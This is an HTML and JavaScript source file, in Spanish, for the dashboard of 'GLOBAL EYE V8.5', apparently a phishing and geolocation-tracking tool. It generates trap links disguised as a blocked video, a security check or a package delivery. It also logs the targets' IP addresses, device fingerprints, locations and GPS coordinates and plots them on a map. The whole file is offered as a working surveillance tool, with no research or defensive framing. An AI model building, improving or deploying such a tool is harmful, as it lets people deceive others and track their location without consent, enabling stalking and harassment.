<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>C&C V8.5 Stable</title>
    
    <script>
        if (!sessionStorage.getItem("secure_token")) {
            window.location.href = "/logout";
        }
    </script>

    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        :root {
            --bg: #0f0f11; --card: #1e1e24; --accent: #00ff88; --text: #ffffff;
            --text-sec: #8b8b93; --danger: #ff4757; 
        }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background-color: var(--bg); color: var(--text); font-family: -apple-system, BlinkMacSystemFont, sans-serif; margin: 0; padding: 0; height: 100vh; overflow: hidden; }
        
        /* HEADER */
        .header { padding: 40px 20px 10px 20px; display: flex; align-items: center; justify-content: space-between; background: var(--bg); z-index: 10; position: relative; }
        .header h1 { font-size: 22px; margin: 0; font-weight: 800; letter-spacing: 1px; }
        .status-badge { background: rgba(0, 255, 136, 0.1); color: var(--accent); padding: 4px 10px; border-radius: 20px; font-size: 10px; font-weight: bold; display: flex; align-items: center; gap: 5px; border: 1px solid rgba(0, 255, 136, 0.2); }
        .dot { width: 6px; height: 6px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); }

        /* CONTENIDO PRINCIPAL */
        .content-area { height: calc(100vh - 140px); overflow-y: auto; padding: 20px; padding-bottom: 100px; }
        
        /* MAPA */
        #map-container { height: 100%; width: 100%; border-radius: 20px; overflow: hidden; display: none; }
        #map { height: 100%; width: 100%; background-color: #1e1e24; }

        /* BARRA DE NAVEGACI√ìN */
        .nav-bar { position: fixed; bottom: 0; width: 100%; background: rgba(15, 15, 17, 0.95); backdrop-filter: blur(10px); border-top: 1px solid #333; display: flex; justify-content: space-around; padding: 15px 0 25px 0; z-index: 100; }
        .nav-item { color: var(--text-sec); text-align: center; font-size: 10px; display: flex; flex-direction: column; align-items: center; gap: 4px; cursor: pointer; width: 33%; transition: 0.2s; }
        .nav-item.active { color: var(--accent); transform: scale(1.1); }
        .nav-item span { font-size: 26px; }

        /* VISTAS */
        .view { display: none; animation: fadeIn 0.3s ease; }
        .view.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }

        /* ESTILOS TARJETAS Y BOTONES */
        .card { background: var(--card); border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid #2a2a30; }
        .label { font-size: 10px; color: var(--text-sec); font-weight: 700; margin-bottom: 8px; display: block; letter-spacing: 1px; }
        input, select { width: 100%; background: #000; border: 1px solid #333; color: #fff; padding: 14px; border-radius: 12px; font-size: 14px; outline: none; transition: 0.2s; }
        input:focus { border-color: var(--accent); }
        
        .btn { width: 100%; padding: 16px; border-radius: 14px; border: none; font-weight: 700; font-size: 15px; cursor: pointer; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .btn-primary { background: var(--accent); color: #000; box-shadow: 0 4px 15px rgba(0, 255, 136, 0.2); }
        .btn-danger { background: rgba(255, 71, 87, 0.1); color: var(--danger); border: 1px solid rgba(255, 71, 87, 0.2); }
        
        /* ESTILOS LOGS */
        .log-item { display: flex; gap: 15px; padding: 15px 0; border-bottom: 1px solid #2a2a30; }
        .log-icon { min-width: 40px; height: 40px; background: #2a2a30; border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 20px; }
        .log-info { flex: 1; overflow: hidden; }
        .log-title { font-weight: bold; font-size: 14px; margin-bottom: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .log-meta { font-size: 11px; color: var(--text-sec); display: flex; align-items: center; gap: 5px; }
        
        .log-map-btn { color: #000; font-size: 10px; font-weight: 800; text-decoration: none; display: inline-flex; align-items: center; gap: 4px; margin-top: 8px; background: #fbce49; padding: 6px 12px; border-radius: 6px; cursor: pointer; box-shadow: 0 0 10px rgba(251, 206, 73, 0.3); transition: 0.2s; }
        .log-map-btn:active { transform: scale(0.95); }
        
        /* ESTILO DE RAYOS X (FINGERPRINT) */
        .log-tech { 
            font-size: 10px; color: var(--accent); margin-top: 6px; 
            font-family: 'Courier New', monospace; 
            border: 1px dashed #333; padding: 6px; border-radius: 6px; 
            background: #111; display: block; width: 100%; word-break: break-word;
        }

        /* SWITCH */
        .row-switch { display: flex; justify-content: space-between; align-items: center; background: #000; padding: 12px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #333; }
        .switch { position: relative; display: inline-block; width: 44px; height: 24px; }
        .switch input { opacity: 0; width: 0; height: 0; }
        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #333; transition: .3s; border-radius: 34px; }
        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; left: 3px; bottom: 3px; background-color: white; transition: .3s; border-radius: 50%; }
        input:checked + .slider { background-color: var(--danger); }
        input:checked + .slider:before { transform: translateX(20px); }
        
        .swal2-popup { background: #1e1e24 !important; color: white !important; border-radius: 20px !important; border: 1px solid #333; }
        .swal2-title { color: white !important; font-size: 18px !important; }
        .swal2-content { color: #aaa !important; }
        .swal2-confirm { background: var(--accent) !important; color: black !important; border-radius: 10px !important; font-weight: bold !important; }
        .swal2-cancel { background: #333 !important; color: white !important; border-radius: 10px !important; }
    </style>
</head>
<body>
    <div class="header">
        <h1>GLOBAL EYE <span style="color:var(--accent)">V8.5</span></h1>
        <a href="/logout" style="text-decoration:none;">
            <div class="status-badge" style="background:rgba(255, 71, 87, 0.1); color:#ff4757; border-color:rgba(255, 71, 87, 0.3);">
                <span class="material-icons-round" style="font-size:14px;">logout</span> SALIR
            </div>
        </a>
    </div>

    <div class="content-area">
        
        <div id="view-home" class="view active">
            <div class="card">
                <label class="label">LINK REAL (TIKTOK/YOUTUBE)</label>
                <input type="text" id="urlDestino" placeholder="Pega el enlace aqu√≠...">
                <div style="height:10px"></div>
                <label class="label">NOMBRE REFERENCIA</label>
                <input type="text" id="nombreTrampa" placeholder="Ej: Objetivo 1">
                
                <div style="height:15px"></div>
                <label class="label">PLANTILLA DE ENGA√ëO (DISFRAZ)</label>
                <select id="templateType" style="margin-bottom:15px;">
                    <option value="video" selected>üì∫ Video Bloqueado (Para TikTok)</option>
                    <option value="security">üõ°Ô∏è Verificaci√≥n de Seguridad</option>
                    <option value="delivery">üì¶ Entrega de Paquete</option>
                </select>

                <div class="row-switch"><span>üõ∞Ô∏è MODO SAT√âLITE</span><label class="switch"><input type="checkbox" id="checkGPS" checked><span class="slider round"></span></label></div>
                <div class="row-switch"><span>üí• AUTODESTRUCCI√ìN</span><label class="switch"><input type="checkbox" id="checkBurn"><span class="slider round"></span></label></div>

                <div onclick="document.getElementById('adv-opts').style.display='block'; this.style.display='none'" style="text-align:center; font-size:11px; color:var(--text-sec); margin-bottom:15px; cursor:pointer; text-decoration:underline;">‚öôÔ∏è Personalizar Disfraz</div>
                
                <div id="adv-opts" style="display:none; margin-bottom:15px; border-top:1px solid #333; padding-top:15px;">
                    <label class="label">T√çTULO FALSO</label><input type="text" id="metaTitulo" placeholder="T√≠tulo...">
                    <div style="height:10px"></div><label class="label">DESCRIPCI√ìN</label><input type="text" id="metaDesc" placeholder="Descripci√≥n...">
                </div>

                <button class="btn btn-primary" onclick="generarLink()">
                    <span class="material-icons-round">bolt</span> GENERAR ENLACE
                </button>
            </div>
        </div>

        <div id="view-logs" class="view">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
                <h2 style="margin:0; font-size:18px;">Registro de Actividad</h2>
                <button onclick="cargarLogs()" style="background:none; border:none; color:var(--accent); font-size:24px;">‚Üª</button>
            </div>
            <div id="logs-container"></div>
            <div style="height:30px"></div>
            <button class="btn btn-danger" onclick="borrarHistorial()">
                <span class="material-icons-round">delete_forever</span> BORRAR DATOS
            </button>
        </div>

        <div id="view-map" class="view" style="height: 100%;">
            <div id="map-container" style="display:block; height: 100%;">
                <div id="map"></div>
            </div>
        </div>

    </div>

    <div class="nav-bar">
        <div class="nav-item active" onclick="cambiarVista('home', this)">
            <span class="material-icons-round">add_circle</span>
            Crear
        </div>
        <div class="nav-item" onclick="cambiarVista('logs', this)">
            <span class="material-icons-round">list_alt</span>
            Lista
        </div>
        <div class="nav-item" onclick="cambiarVista('map', this)">
            <span class="material-icons-round">public</span>
            Mapa Global
        </div>
    </div>

    <script>
        var map = null;
        var markers = [];

        function initMap() {
            if(map) return;
            map = L.map('map').setView([0,0], 2);
            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                attribution: '&copy; OpenStreetMap &copy; CARTO', maxZoom: 20
            }).addTo(map);
        }

        function updateMapPoints(logs) {
            if(!map) return;
            markers.forEach(m => map.removeLayer(m));
            markers = [];
            logs.forEach(log => {
                // FILTRO: Solo pintamos en el mapa si NO es 0,0
                if(log.lat && log.lon && log.lat != "0" && log.lat != 0) {
                    var circle = L.circleMarker([log.lat, log.lon], {
                        color: '#ff2d55',
                        fillColor: '#ff2d55',
                        fillOpacity: 0.8,
                        radius: 6
                    }).addTo(map);
                    circle.bindPopup(`<b>${log.ip}</b><br>${log.hora}`);
                    markers.push(circle);
                }
            });
        }

        function focalizarObjetivo(lat, lon) {
            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            
            document.getElementById('view-map').classList.add('active');
            document.querySelectorAll('.nav-item')[2].classList.add('active');
            
            setTimeout(() => {
                initMap();
                map.invalidateSize(); 
                cargarLogs(true);
                map.flyTo([lat, lon], 15, { animate: true, duration: 1.5 });
            }, 100);
        }

        function cambiarVista(vista, elem) {
            document.querySelectorAll('.view').forEach(v => v.classList.remove('active')); 
            document.querySelectorAll('.nav-item').forEach(x=>x.classList.remove('active'));
            document.getElementById('view-'+v).classList.add('active'); 
            elem.classList.add('active');
            if(vista === 'logs') cargarLogs(); 
            else if(v==='map'){ 
                setTimeout(()=>{ 
                    initMap(); 
                    map.invalidateSize();
                    cargarLogs(true); 
                }, 100); 
            }
        }
        
        async function generarLink(){
            let btn = document.querySelector('.btn-primary'); let originalText = btn.innerHTML; btn.innerHTML = "‚è≥...";
            let p = {
                nombre: document.getElementById('nombreTrampa').value || "Link",
                url_destino: document.getElementById('urlDestino').value,
                usar_gps: document.getElementById('checkGPS').checked,
                one_time: document.getElementById('checkBurn').checked,
                template_type: document.getElementById('templateType').value,
                meta_titulo: document.getElementById('metaTitulo').value,
                meta_desc: document.getElementById('metaDesc').value
            };
            if(!p.url_destino){ Swal.fire({icon:'warning', title:'Falta Link', background:'#1e1e24', color:'#fff'}); btn.innerHTML = originalText; return; }
            if(!p.url_destino.startsWith('http')) p.url_destino = 'https://'+p.url_destino;
            try {
                let r = await fetch('/api/crear_trampa',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)});
                let d = await r.json();
                if(d.error || !d.link) throw new Error(d.error || "Error del servidor");
                Swal.fire({title:'¬°Listo!', text:d.link, icon:'success', confirmButtonText:'COPIAR', background:'#1e1e24', color:'#fff'}).then((r)=>{if(r.isConfirmed) navigator.clipboard.writeText(d.link)});
                btn.innerHTML = originalText;
            } catch(e){ 
                Swal.fire({icon:'error', title:'Error', text: e.message, background:'#1e1e24', color:'#fff'});
                btn.innerHTML = originalText; 
            }
        }

        // --- CORRECCI√ìN PRINCIPAL AQU√ç: PROTECCI√ìN CONTRA DATOS NULOS ---
        async function cargarLogs(updateMap = false) {
            try {
                let res = await fetch('/api/ver_ataques');
                let data = await res.json();
                
                if(updateMap) { updateMapPoints(data); return; }

                let container = document.getElementById('logs-container');
                let html = "";
                
                if(data.length === 0) html = "<div style='text-align:center;color:#666;margin-top:40px'>Vac√≠o</div>";
                
                data.forEach(l => {
                    // Aseguramos que las variables no sean nulas
                    let dispositivo = l.dispositivo || "Desconocido";
                    let fingerprint = l.fingerprint || "";
                    
                    let icon = "laptop";
                    if(dispositivo.includes("iPhone")) icon = "phone_iphone";
                    else if(dispositivo.includes("Android")) icon = "android";
                    
                    let gpsBtn = "";
                    if(l.lat && l.lon && l.lat != "0" && l.lat != 0) {
                        gpsBtn = `<div class="log-map-btn" onclick="focalizarObjetivo(${l.lat},${l.lon})">
                            üìç VER EN MAPA
                        </div>`;
                    }

                    let fpHTML = fingerprint ? `<div class="log-tech">${fingerprint}</div>` : "";
                    
                    html+=`<div class="log-item">
                        <div class="log-icon"><span class="material-icons-round">${icon}</span></div>
                        <div class="log-info">
                            <div class="log-title">${l.ubicacion || "Desconocida"}</div>
                            <div class="log-meta">${l.ip || "IP Oculta"} ‚Ä¢ ${l.hora || "-"}</div>
                            <div class="log-meta" style="color:#666;">üéØ ${l.trampa || "Trampa"}</div>
                            ${fpHTML}
                            ${gpsBtn}
                        </div>
                    </div>`;
                });
                container.innerHTML = html;
            } catch(e){ 
                console.error(e); 
                // Si hay error, mostramos bot√≥n de borrar para salir del bucle
                document.getElementById('logs-container').innerHTML = "<div style='color:red;text-align:center'>Error leyendo datos antiguos.<br>Por favor borra el historial.</div>";
            }
        }

        async function borrarHistorial() {
            Swal.fire({
                title: '¬øBorrar todo?', icon: 'warning', showCancelButton: true,
                confirmButtonColor: '#ff4757', cancelButtonColor: '#333',
                confirmButtonText: 'S√≠, borrar', background: '#1e1e24', color: '#fff'
            }).then(async (result) => {
                if (result.isConfirmed) {
                    await fetch('/api/borrar_logs', { method: 'POST' });
                    cargarLogs();
                    if(map) { markers.forEach(m => map.removeLayer(m)); markers=[]; }
                    Swal.fire({title:'Borrado', icon:'success', background: '#1e1e24', color: '#fff'});
                }
            })
        }
        
        cargarLogs();
    </script>
</body>
</html>
